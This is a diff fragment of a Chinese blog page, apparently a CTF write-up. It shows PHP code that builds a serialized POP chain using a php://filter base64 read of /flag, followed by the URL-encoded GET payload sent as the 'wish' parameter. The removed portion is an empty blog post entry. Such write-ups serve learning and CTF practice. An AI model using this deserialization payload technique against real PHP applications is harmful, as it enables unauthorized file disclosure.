+<h3 id="构造Payload"><a href="#构造Payload" class="headerlink" title="构造Payload"></a>构造Payload</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Road_is_Long&#123;</span><br><span class="line">    public $page;</span><br><span class="line">    public $string;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">class Try_Work_Hard&#123;</span><br><span class="line">    protected  $var=&quot;php://filter/convert.base64-encode/resource=/flag&quot;;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">class Make_a_Change&#123;</span><br><span class="line">    public $effort;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">$f = new Try_Work_Hard();</span><br><span class="line">$m = new Make_a_Change();</span><br><span class="line">$m-&gt;effort = $f;</span><br><span class="line">$b = new Road_is_Long();</span><br><span class="line">$b-&gt;string = $m;</span><br><span class="line">$a = new Road_is_Long();</span><br><span class="line">$a-&gt;page = $b;</span><br><span class="line"></span><br><span class="line">echo urlencode(serialize($a));</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><strong>GET</strong>传入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/wish=O%3A12%3A%22Road_is_Long%22%3A2%3A%7Bs%3A4%3A%22page%22%3BO%3A12%3A%22Road_is_Long%22%3A2%3A%7Bs%3A4%3A%22page%22%3BN%3Bs%3A6%3A%22string%22%3BO%3A13%3A%22Make_a_Change%22%3A1%3A%7Bs%3A6%3A%22effort%22%3BO%3A13%3A%22Try_Work_Hard%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00var%22%3Bs%3A49%3A%22php%3A%2F%2Ffilter%2Fconvert.base64-encode%2Fresource%3D%2Fflag%22%3B%7D%7D%7Ds%3A6%3A%22string%22%3BN%3B%7D</span><br></pre></td></tr></table></figure>
+      
+    </div>
+    
+  </div>
+
+  <div class="article-footer">
+    <div class="article-meta pull-left">
+
+    
+
+    
+
+    </div>
+
+    
+  </div>
+  
+    
+    <h3 class="article-read"><a href="/2024/08/04/2022-popchains/"><span>more</span></a></h3>
     
   
 </article>
@@ -919,60 +990,6 @@ http请求遇到两个\r\n即%0d%0a，会将前半部分当做头部解析，而
   
     
     <h3 class="article-read"><a href="/2024/06/09/php伪协议/"><span>more</span></a></h3>
-    
-  
-</article>
-
-
-
-
-
-  <article class="article-container ">
-
-  
-    
-    <h3 class="article-title"><a href="/2024/06/09/我的第一篇文章/"><span>我的第一篇文章</span></a></h3>
-    
-  
-
-  <div class="article-top-meta">
-    <span class="posted-on">
-      <a href="/2024/06/09/我的第一篇文章/" rel="bookmark">
-        <time class="entry-date published" datetime="2024-06-09T05:31:36.000Z">
-          2024-06-09
-        </time>
-      </a>
-    </span>
-    <br />
-    
-  </div>
-
-
-  
-
-  <div class="article-content">
-    <div class="entry">
-      
-          
-      
-    </div>
-    
-  </div>
-
-  <div class="article-footer">
-    <div class="article-meta pull-left">
-
-    
-
-    
-
-    </div>
-
-    
-  </div>
-  
-    
-    <h3 class="article-read"><a href="/2024/06/09/我的第一篇文章/"><span>more</span></a></h3>
     
   
 </article>
